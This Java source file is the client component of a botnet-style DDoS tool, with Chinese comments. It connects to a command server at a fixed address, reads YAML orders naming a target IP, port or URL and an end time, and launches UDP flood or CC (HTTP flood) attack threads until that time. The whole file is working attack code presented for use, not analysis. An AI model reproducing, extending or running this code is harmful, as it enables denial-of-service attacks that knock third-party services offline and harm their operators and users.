package com.zhanyingwl.www;

import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.*;

import static java.lang.Thread.sleep;

/**
 * @ClassName : doConnect
 * @Description : 启动类
 * @Author : 战鹰
 * @Version: 2.0
 */

public class doDCRun extends Thread {
    public static volatile boolean stop;

    static Socket socket;
    static String getInfo;
    static String endAt;
    static String attackType;
    static String targetIp;
    static String targetPort;
    static String targetURL;
    static String URLheader;
    static int threadLock = 0; // 线程锁 防止每秒增加一个线程
    static Yaml yml = new Yaml();
    static String UDPData = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";

    public static void main(String[] args) { // 心跳包 心跳内容用数据就行
        while (true) {
            try {
                socket = new Socket(InetAddress.getByName("192.168.1.2"), 8090); // 这是客户端 获取之后直接转换为yml和map
                while (true) {
                    InputStream inputStream = socket.getInputStream();
                    byte[] bytes = new byte[1024];
                    int changdu = inputStream.read(bytes);
                    getInfo = new String(bytes, 0, changdu);
                    Map targetInfo = yml.load(getInfo); // 把String转换为yml形式的map
                    attackType = targetInfo.get("attackType").toString();
                    switch (attackType) { // 添加攻击模式在这里添加即可
                        case "udp": // udp攻击
                            DateFormat sdf1 = new SimpleDateFormat("EEE MMM dd HH:mm:ss zzz yyyy", Locale.ENGLISH);
                            targetIp = targetInfo.get("targetIp").toString();
                            targetPort = targetInfo.get("targetPort").toString();
                            endAt = targetInfo.get("endAt").toString();
                            Date fendAt1 = sdf1.parse(endAt);
                            Date now1 = new Date();
                            if (!now1.after(fendAt1)) {
                                if (threadLock == 0) { // 线程没上锁 说明单线程尚未创建
                                    stop = false;
                                    udpThread udpThread = new udpThread();
                                    udpThread.start();
                                    threadLock = 1;
                                }
                            } else if (now1.after(fendAt1)) {
                                stop = true; // 计时用的 到了时间就置为true 子线程看到后就停止攻击
                            }
                            break;
                        case "cc": // cc攻击
                            DateFormat sdf2 = new SimpleDateFormat("EEE MMM dd HH:mm:ss zzz yyyy", Locale.ENGLISH);
                            URLheader = targetInfo.get("URLheader").toString();
                            targetURL = targetInfo.get("targetURL").toString();
                            targetPort = targetInfo.get("targetPort").toString();
                            endAt = targetInfo.get("endAt").toString();
                            Date fendAt2 = sdf2.parse(endAt);
                            Date now2 = new Date();
                            if (!now2.after(fendAt2)) {
                                if (threadLock == 0) { // 线程没上锁 说明单线程尚未创建
                                    stop = false;
                                    ccThread ccThread = new ccThread();
                                    ccThread.start();
                                    threadLock = 1;
                                }
                            } else if (now2.after(fendAt2)) {
                                stop = true;
                            }
                            break;
                        default:
                            break;
                    }
                    sleep(1000);
                }
            } catch (Exception ignored) {
                try {
                    socket.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

}